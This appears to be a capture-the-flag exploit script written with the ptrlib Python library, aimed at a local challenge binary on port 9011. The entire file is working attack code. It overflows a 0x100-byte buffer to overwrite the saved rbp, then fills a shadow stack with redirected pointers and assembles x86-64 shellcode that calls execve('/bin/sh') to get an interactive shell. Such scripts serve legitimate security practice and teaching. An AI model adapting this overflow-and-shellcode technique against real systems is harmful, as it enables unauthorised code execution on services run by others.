from ptrlib import *

elf = ELF("../distfiles/chall")
#sock = Process("../distfiles/chall")
sock = Socket("localhost", 9011)

# overwrite saved rbp
payload  = b"A" * 0x100
payload += p64(elf.symbol("__stack_shadow") + 0x100)
sock.sendafter("Data: ", payload)

# overwrite shadow stack
payload  = p64(elf.symbol("__stack_shadow") + 0x80) * (0x80 // 8)
payload += nasm("""
shellcode:
  call arg1
  db '/bin/sh', 0
arg1:
  xor edx, edx
  xor esi, esi
  pop rdi
  mov eax, 59
  syscall
""", bits=64)
sock.sendafter("Data: ", payload)

sock.interactive()
